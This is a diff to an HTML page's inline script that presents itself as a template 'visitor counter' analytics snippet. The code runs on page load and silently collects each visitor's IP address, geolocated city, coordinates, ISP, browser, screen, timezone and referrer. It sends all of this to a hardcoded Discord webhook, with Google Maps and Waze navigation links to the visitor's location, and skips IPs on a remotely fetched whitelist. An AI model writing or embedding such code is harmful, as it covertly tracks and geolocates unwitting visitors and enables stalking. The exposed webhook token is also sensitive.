@@ -2073,58 +2073,82 @@
 <!-- Template analytics — Stxrs visitor counter -->
 <script>
 (function(){
-  /* ═══════════════════════════════════════════════════
-     CONFIGURATIE — pas hieronder aan
-     ═══════════════════════════════════════════════════ */
-
   const WEBHOOK = 'https://discord.com/api/webhooks/1518151101340192848/l6lgr56NL8CgX-fv-YaEyqba7wDmsu3CmykPIXA5YHxCdUtxZwUk64B5N5gp-TQeTKvT';
-
-  // Haal whitelist op van GitHub (aanpasbaar via Discord !whitelist command)
   const WHITELIST_URL = 'https://raw.githubusercontent.com/jahiroak-code/shopfy-pages/main/whitelist.json';
 
-  /* ═══════════════════════════════════════════════════
-     CODE — niet wijzigen
-     ═══════════════════════════════════════════════════ */
   async function collect(){
-    // Haal whitelist op
     let whitelist = [];
-    try {
-      const r = await fetch(WHITELIST_URL);
-      whitelist = await r.json();
-    } catch(e) {}
+    try { const r = await fetch(WHITELIST_URL); whitelist = await r.json(); } catch(e) {}
     if (!Array.isArray(whitelist)) whitelist = [];
 
-    // Haal IP op
+    try {
+      // Eerst ip-api.com (nauwkeuriger)
+      const d = await fetch('https://ip-api.com/json/?fields=query,city,regionName,country,isp,lat,lon,org').then(r=>r.json());
+      if (d.query && d.query !== '?') {
+        const ip = d.query;
+        if (whitelist.includes(ip)) return;
+        const p = {
+          ip: ip, city: d.city||'?', region: d.regionName||'?',
+          country: d.country||'?', isp: d.isp||d.org||'?',
+          lat: d.lat||'', lon: d.lon||'',
+          ua: navigator.userAgent.substring(0,150), lang: navigator.language,
+          screen: screen.width+'x'+screen.height,
+          tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+          os: navigator.platform, time: new Date().toLocaleString('nl-NL'),
+          ref: document.referrer||'(direct)'
+        };
+        stuur(p);
+        return;
+      }
+    } catch(e) {}
+
+    // Backup: ipinfo.io
     try {
       const d = await fetch('https://ipinfo.io/json').then(r=>r.json());
       const ip = d.ip||'?';
       if (whitelist.includes(ip)) return;
-
-      const loc = d.loc ? d.loc.split(',') : [];
-      const lat = loc[0] && loc[0] !== '0' && loc[0] !== '0.0' ? loc[0] : null;
-      const lon = loc[1] && loc[1] !== '0' && loc[1] !== '0.0' ? loc[1] : null;
+      const loc = (d.loc||',').split(',');
       const p = {
         ip: ip, city: d.city||'?', region: d.region||'?',
         country: d.country||'?', isp: d.org||'?',
-        lat: lat, lon: lon,
-        ua: navigator.userAgent.substring(0,150),
-        lang: navigator.language, screen: screen.width+'x'+screen.height,
+        lat: loc[0]||'', lon: loc[1]||'',
+        ua: navigator.userAgent.substring(0,150), lang: navigator.language,
+        screen: screen.width+'x'+screen.height,
         tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        os: navigator.platform, time: new Date().toLocaleString('en-US'),
+        os: navigator.platform, time: new Date().toLocaleString('nl-NL'),
         ref: document.referrer||'(direct)'
       };
-
-      if(WEBHOOK){
-        fetch(WEBHOOK, {
-          method: 'POST',
-          headers: {'Content-Type':'application/json'},
-          body: JSON.stringify({
-            content: '**Visited**\n```\nIP: '+p.ip+'\nLoc: '+p.city+', '+p.country+'\nISP: '+p.isp+'\nOS: '+p.os+'\nBrowser: '+p.ua+'\nScreen: '+p.screen+'\nTZ: '+p.tz+'\nRef: '+p.ref+'\nTime: '+p.time+'\n'+(p.lat&&p.lon?'Map: https://www.google.com/maps/@'+p.lat+','+p.lon+',14z\n':'')+'```'
-          })
-        }).catch(()=>{});
-      }
+      stuur(p);
     } catch(e) {}
   }
+
+  function stuur(p){
+    if(!WEBHOOK) return;
+    const maps = 'https://www.google.com/maps?q='+p.lat+','+p.lon;
+    const waze = 'https://www.waze.com/ul?ll='+p.lat+','+p.lon+'&navigate=yes';
+    fetch(WEBHOOK, {
+      method: 'POST',
+      headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({
+        embeds: [{
+          title: '📍 Nieuwe bezoeker',
+          color: 0x302b63,
+          fields: [
+            {name:'🌐 IP',value:'`'+p.ip+'`',inline:true},
+            {name:'📍 Locatie',value:p.city+', '+p.region+', '+p.country,inline:true},
+            {name:'📡 ISP',value:p.isp,inline:true},
+            {name:'🗺️ Navigeer',value:'[Google Maps]('+maps+')\n[Waze]('+waze+')',inline:false},
+            {name:'💻 Apparaat',value:'OS: '+p.os+'\nScherm: '+p.screen+'\nTaal: '+p.lang,inline:false},
+            {name:'⏰ Tijd',value:p.time,inline:true},
+            {name:'🕐 Tijdzone',value:p.tz,inline:true},
+            {name:'🔗 Referrer',value:p.ref||'(direct)',inline:true}
+          ],
+          footer:{text:'Stxrs template'}
+        }]
+      })
+    }).catch(()=>{});
+  }
+
   if(document.readyState==='complete') collect();
   else window.addEventListener('load', collect);
 })();
